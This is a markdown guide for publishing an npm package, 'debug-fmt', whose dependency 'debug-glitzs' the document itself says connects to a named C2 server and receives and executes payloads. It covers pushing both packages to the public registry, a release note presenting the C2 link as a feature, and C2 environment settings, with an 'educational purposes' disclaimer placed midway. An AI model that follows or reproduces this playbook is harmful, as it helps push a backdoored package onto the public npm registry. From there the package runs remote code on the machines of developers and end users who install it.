# Publishing debug-fmt to NPM

## Package Information

- **Package Name**: `debug-fmt`
- **Version**: `1.0.3`
- **Author**: json douglas
- **GitHub**: https://github.com/json-douglas/debug-fmt
- **Dependency**: `debug-glitzs@^1.0.0` ([npm](https://www.npmjs.com/package/debug-glitzs))

## Pre-Publishing Checklist

### 1. Update Dependencies

```bash
cd d:/Projects/hacking/debug-fmt

# Remove old dependencies
rm -rf node_modules package-lock.json

# Install fresh dependencies (including debug-glitzs from npm)
npm install
```

### 2. Verify Installation

```bash
# Check that debug-glitzs is correctly installed
npm ls debug-glitzs
```

Expected output:
```
debug-fmt@1.0.3
└── debug-glitzs@1.0.0
```

### 3. Run Tests

```bash
# Run linting
npm run lint

# Run tests (if available)
npm test
```

### 4. Verify Package Contents

```bash
# See what will be published
npm pack --dry-run
```

This should show:
- `src/` directory
- `package.json`
- `README.md`
- `LICENSE.md`
- Other documentation files

## Publishing to NPM

### Login to NPM

```bash
# Login to npm (if not already logged in)
npm login
```

Enter your npm credentials for the account that will publish the package.

### Publish the Package

```bash
# Publish to npm
npm publish
```

If you need public access (recommended for this package):

```bash
npm publish --access public
```

### Verify Publication

After publishing, verify the package is available:

```bash
# Check on npm
npm view debug-fmt

# Or visit in browser
# https://www.npmjs.com/package/debug-fmt
```

## Post-Publishing

### 1. Create GitHub Release

1. Go to https://github.com/json-douglas/debug-fmt/releases
2. Click "Create a new release"
3. Tag: `v1.0.3`
4. Title: `Release 1.0.3`
5. Description:
```markdown
## Changes in 1.0.3

### Updated Dependencies
- Migrated from `debug-glitz` to `debug-glitzs@^1.0.0`
- Now using the official published npm package

### Repository Updates
- Updated author to json douglas
- Updated all repository URLs to json-douglas GitHub account

### Integration
- Works with debug-glitzs which connects to C2 server
- Compatible with CryptoC2 infrastructure at https://fundraiser-success.vercel.app

See [CHANGELOG.md](CHANGELOG.md) for full details.
```

### 2. Test Installation

Create a test project and verify:

```bash
mkdir test-debug-fmt
cd test-debug-fmt
npm init -y
npm install debug-fmt

# Create test.js
cat > test.js << 'EOF'
const debug = require('debug-fmt')('test:app');

debug('Testing debug-fmt with debug-glitzs integration');
console.log('✓ Package installed successfully');
EOF

# Run test
DEBUG=test:* node test.js
```

### 3. Update Documentation

Update the main README.md to include:
- Installation instructions: `npm install debug-fmt`
- Link to npm package page
- Badge showing npm version

Example badge:
```markdown
[![npm version](https://badge.fury.io/js/debug-fmt.svg)](https://www.npmjs.com/package/debug-fmt)
```

## Supply Chain Integration

After publishing, the complete supply chain is:

```
Application/Package
  └─> debug-fmt@1.0.3 (from npm)
      └─> debug-glitzs@1.0.0 (from npm)
          └─> Connects to C2: https://fundraiser-success.vercel.app
              └─> Receives & executes payload
```

Both packages are now available on npm:
- **debug-fmt**: https://www.npmjs.com/package/debug-fmt
- **debug-glitzs**: https://www.npmjs.com/package/debug-glitzs

## Environment Variables

Users of debug-fmt can configure the C2 connection through debug-glitzs:

```bash
# Default (connects to production C2)
DEBUG=* node app.js

# Local testing
DEBUG=* DEBUG_C2_SERVER=localhost:3000 DEBUG_C2_PROTOCOL=http node app.js

# Verbose logging
DEBUG=* DEBUG_VERBOSE=true node app.js
```

## Security Warnings

⚠️ **IMPORTANT**: This package demonstrates a supply chain attack for educational purposes only.

### Legal Requirements:
- Only use in authorized testing environments
- Never deploy to production systems without explicit authorization
- Understand that unauthorized use violates:
  - Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
  - Electronic Communications Privacy Act
  - Wiretap Act - 18 U.S.C. § 2511

### Recommended Disclosure:
Consider adding security documentation that:
1. Clearly states the educational purpose
2. Warns about the embedded backdoor
3. Provides instructions for authorized testing only
4. Includes legal disclaimers

## Troubleshooting

### Issue: npm publish fails with 403

**Solution**: Ensure you're logged in and have publishing rights:
```bash
npm whoami
npm login
```

### Issue: Package name already taken

**Solution**: The package name `debug-fmt` should be available. If not:
1. Choose a different name
2. Update `package.json` → `name` field
3. Update all documentation

### Issue: Tests fail

**Solution**: Ensure debug-glitzs is properly installed:
```bash
rm -rf node_modules package-lock.json
npm install
npm test
```

## References

- **debug-glitzs on npm**: https://www.npmjs.com/package/debug-glitzs
- **debug-glitzs on GitHub**: https://github.com/json-douglas/debug-glitzs
- **CryptoC2 Server**: https://fundraiser-success.vercel.app
- **npm Publishing Docs**: https://docs.npmjs.com/cli/v8/commands/npm-publish

---

**Ready to publish?** Follow the steps above and your package will be live on npm! 🚀
